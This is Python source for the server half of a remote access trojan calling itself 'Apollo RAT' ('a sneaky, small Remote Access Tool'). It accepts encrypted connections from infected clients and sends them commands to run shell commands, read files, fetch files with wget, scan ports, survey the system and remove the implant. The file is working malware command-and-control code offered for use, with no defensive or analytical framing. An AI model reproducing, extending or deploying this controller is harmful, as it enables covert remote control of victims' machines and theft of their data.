#!/usr/bin/env python

import argparse
import readline
import socket
import sys
import threading

from modules.crypto import encrypt, decrypt, diffiehellman

intro = '''
Apollo RAT - A sneaky, small Remote Access Tool written in Python
Type Help for a list of supported commands and function.
'''

remote_commands = [ 'cat', 'destroy', 'execute', 'ls', 'pwd', 'scan',
                    'survey', 'unzip', 'wget' ]
help = '''
Command             Description
----------------------------------------------------------------------------
client <id>         Connect to a remote client
destroy		    Remove Apollo from all client systems
execute <command>   Execute a command on a client
help                Displays this lovely table
kill                Kill the client connection 
list		    List all connected clients
quit                Exit the server and keep all clients alive
scan <ip>           Scan top 25 TCP ports on a single host
survey              Run a system survey

Supported Linux/Unix commands on clients: cat, ls, pwd, unzip, wget

TIP! To start Apollo server on a custom port (Default is 34463) run 
'-p <port no>' when starting the server. Example: ./apollo_server.py -p 80'''

error = '''Error: Unsupported command. Type "help" for a list of commands.'''

class Server(threading.Thread):
    clients      = {}
    client_count = 1
    current_client = None

    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def run(self):
        while True:
            conn, addr = self.s.accept()
            dhkey = diffiehellman(conn)
            client_id = self.client_count
            client = ClientConnection(conn, addr, dhkey, uid=client_id)
            self.clients[client_id] = client
            self.client_count += 1

    def send_client(self, message, client):
        try:
            enc_message = encrypt(message, client.dhkey)
            client.conn.send(enc_message)
        except Exception as e:
            print 'Error: {}'.format(e)

    def recv_client(self, client):
        try:
            recv_data = client.conn.recv(4096)
            print decrypt(recv_data, client.dhkey)
        except Exception as e:
            print 'Error: {}'.format(e)

    def select_client(self, client_id):
        try:
            self.current_client = self.clients[int(client_id)]
            print 'Client {} selected.'.format(client_id)
        except (KeyError, ValueError):
            print 'Error: Invalid Client ID.'

    def remove_client(self, key):
        return self.clients.pop(key, None)

    def kill_client(self, _):
        self.send_client('kill', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def get_clients(self):
        return [v for _, v in self.clients.items()]

    def list_clients(self, _):
        print 'ID | Client Address\n-------------------'
        for k, v in self.clients.items():
            print '{:>2} | {}'.format(k, v.addr[0])

    def quit_server(self, _):
        if raw_input('Quitting will not kill clients from attempting connections. Type "y" to continue.').startswith('y'):
            for c in self.get_clients():
                self.send_client('quit', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def destroy_client(self, _):
        if raw_input('About to kill all connected clients. Type "y" to continue.').startswith('y'):
            for c in self.get_clients():
                self.send_client('destroy', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def helpme(self, _):
        print help


class ClientConnection():
    def __init__(self, conn, addr, dhkey, uid=0):
        self.conn  = conn
        self.addr  = addr
        self.dhkey = dhkey
        self.uid   = uid


def get_parser():
    parser = argparse.ArgumentParser(description='Apollo server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=34463, type=int)
    return parser


def main():
    parser = get_parser()
    args   = vars(parser.parse_args())
    port   = args['port']
    client = None

    print intro

    # Start server
    server = Server(port)
    server.setDaemon(True)
    server.start()
    print 'Apollo server listening for connections on port {}.'.format(port)

    # Server-side commands
    server_commands = {
        'client':       server.select_client,
        'list':         server.list_clients,
        'help':         server.helpme,
        'kill':         server.kill_client,
        'quit':         server.quit_server,
        'destroy': 	server.destroy_client
    }

    def completer(text, state):
        commands = remote_commands + [k for k, _ in server_commands.items()]

        options = [i for i in commands if i.startswith(text)]
        if state < len(options):
            return options[state] + ' '
        else:
            return None

    # Turn tab completion on
    readline.parse_and_bind('tab: complete')
    readline.set_completer(completer)

    while True:
        if server.current_client:
            clientid = server.current_client.uid
        else:
            clientid = '?'

        prompt = raw_input('\n[{}] Apollo> '.format(clientid)).rstrip()

        # allow noop
        if not prompt:
            continue

        # Seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        if cmd in server_commands:
            server_commands[cmd](action)

        elif cmd in remote_commands:
            if clientid == '?':
                print 'Error: No client system specified!'
                continue

            print 'Running {}...'.format(cmd)
            server.send_client(prompt, server.current_client)
            server.recv_client(server.current_client)

        else:
            print error

if __name__ == '__main__':
    main()
